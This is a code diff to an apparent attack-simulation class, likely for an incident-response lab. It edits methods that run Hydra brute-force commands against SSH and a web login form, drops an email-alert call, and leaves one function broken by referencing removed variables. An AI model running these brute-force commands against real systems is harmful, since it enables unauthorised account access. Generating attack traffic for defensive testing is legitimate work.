@@ -7,6 +7,7 @@ import logging as log
 import inspect
 import json
 import random
+from datetime import datetime
 
 import mysql_bandwidth_monitor
 from DataAccess import DataAccess, attacker, employees
@@ -136,8 +137,6 @@ class attackerClass(object):
         '''
         try:
             values = {"IP": ip, "User": user, "Pass": password}
-            email_values = {"sender":"test1@test.co.za","receiver":"test3@test.co.za","subject":method,"message":method +" On Server: "+ip}
-            attackerClass.execute_email_script(email_values)
             the_method = getattr(attackerClass, method)(values)
             print()
             print("Method: " + method + " Executed")
@@ -163,7 +162,7 @@ class attackerClass(object):
 
         try:
             print("Hydra BruteForce Being Executed")
-            command = "hydra -L /home/alex/Documents/GitRepo/IR/usernames.txt -P /home/alex/Documents/GitRepo/IR/passwords.txt {} ssh".format(ip)
+            command = "hydra -L /home/attacker/IR/usernames.txt -P /home/alex/Documents/GitRepo/IR/passwords.txt {} ssh".format(ip)
             child = pexpect.spawn(command)
             time.sleep(30)
             print("BruteForce Successfully Executed")
@@ -868,7 +867,7 @@ class attackerClass(object):
 
         try:
             print("Hydra BruteForce On Webpage (Admin) Being Executed")
-            command = "hydra -l admin -P /home/alex/Documents/GitRepo/IR/passwords.txt {} http-post-form ""/index.php/component/users/?view=login&Itemid=106:tfUName=^USER^&tfUPass=^PASS^:S=logout"" -v -f".format(
+            command = "hydra -l admin -P /home/attacker/IR/passwords.txt {} http-post-form ""/index.php/component/users/?view=login&Itemid=106:tfUName=^USER^&tfUPass=^PASS^:S=logout"" -v -f".format(
                 ip)
             child = pexpect.spawn(command)
             time.sleep(30)
@@ -896,7 +895,7 @@ class attackerClass(object):
 
         try:
             print("Hydra BruteForce On Webpage (User) Being Executed")
-            command = "hydra -l user -P /home/alex/Documents/GitRepo/IR/passwords.txt {} http-post-form ""/index.php/component/users/?view=login&Itemid=106:tfUName=^USER^&tfUPass=^PASS^:S=logout"" -v -f".format(
+            command = "hydra -l user -P /home/attacker/IR/passwords.txt {} http-post-form ""/index.php/component/users/?view=login&Itemid=106:tfUName=^USER^&tfUPass=^PASS^:S=logout"" -v -f".format(
                 ip)
             child = pexpect.spawn(command)
             time.sleep(30)
@@ -1007,7 +1006,7 @@ class attackerClass(object):
         Start port connection script
         '''
         ip = args["IP"]
-        port = 21
+        port = random.choice([1, 2, 3])
 
         try:
 
@@ -1060,19 +1059,13 @@ class attackerClass(object):
 
     "===================================================================SENDEMAIL METHOD========================================================================="
     @staticmethod
-    def execute_email_script(args):
+    def execute_email_script():
         '''
         Send email with parameters received from the args
         '''
-
-        msg_sender = args["sender"]
-        msg_receiver = args["receiver"]
-        msg_attack = args["message"]
-        msg_subject =args["subject"]
-
         try:
 
-            subprocess.call(shlex.split('python3 sendemail.py {} {} """{}""" {}'.format(msg_sender,msg_receiver,msg_attack,msg_subject)))
+            subprocess.call(shlex.split('python3 sendemail.py'.format(msg_sender,msg_receiver,msg_attack,msg_subject)))
 
         except Exception as e:
             print (str(e))
@@ -1081,14 +1074,19 @@ class attackerClass(object):
 
     "===================================================================INITIATE METHOD========================================================================="
     def start_attack(self):
-        random_repetition = random.randint(1, 5)
-        print('Running ' + str(random_repetition) + ' times')
+       # random_repetition = random.randint(1, 5)
+       # print('Running ' + str(random_repetition) + ' times')
+        current_date=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        random_time=random.randint(10,30)
+        object=attackerClass()
+        the_array=object.get_data()
+        object.generate_random_request(the_array)
+        object.record_transaction(current_date)
+        time.sleep(random_time)
+        print('====COmplete====')
 
-        # Getting Test ID
-        parse = argparse.ArgumentParser()
-        parse.add_argument("testID", help="Pass testID to script")
-        args = parse.parse_args()
 
+        '''
         for i in range(0, random_repetition):
             print('Iteration ' + str(i))
             random_time = random.randint(10, 30)
@@ -1098,7 +1096,7 @@ class attackerClass(object):
             object.record_transaction(args.testID)
             time.sleep(random_time)
         print('====Execution Complete====')
-
+        '''
 
     "===================================================================INITIATE METHOD========================================================================="
 
